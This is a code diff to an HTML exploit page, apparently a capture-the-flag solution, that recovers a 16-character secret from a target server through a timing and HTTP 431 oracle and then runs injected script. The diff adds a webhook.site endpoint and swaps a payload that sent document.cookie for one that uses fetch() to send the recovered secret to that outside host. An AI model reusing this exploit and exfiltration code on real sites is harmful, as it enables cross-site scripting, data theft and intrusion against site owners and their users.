@@ -2,6 +2,7 @@
 <body>
 <script type="module">
 const BASE_URL = "http://server.kerberoz.in:3001";
+const EXFIL = "https://webhook.site/98038103-c310-4435-a24f-e74200b0aebc";
 
 const CHARS = "0123456789abcdef".split("");
 const LENGTH = 16;
@@ -21,7 +22,7 @@ const got431 = (prefix, padLength) => {
     window.onmessage = ({ data }) => {
       if (data === "ping") resolve(false);
     };
-    setTimeout(() => resolve(true), 250);
+    setTimeout(() => resolve(true), 350);
     win.location = getUrl(prefix, padLength, xss);
   });
 };
@@ -56,11 +57,11 @@ const getThreshold = async () => {
     }
   }
 
-  // Critical: use location.origin, not BASE_URL
+  // Exfiltrate the reconstructed 16-char secret
   const finalUrl = getUrl(
     known,
     0,
-    `location="${location.origin}/flag?"+document.cookie`
+    `fetch("${EXFIL}?flag=${known.join("")}")`
   );
 
   win.location = finalUrl;
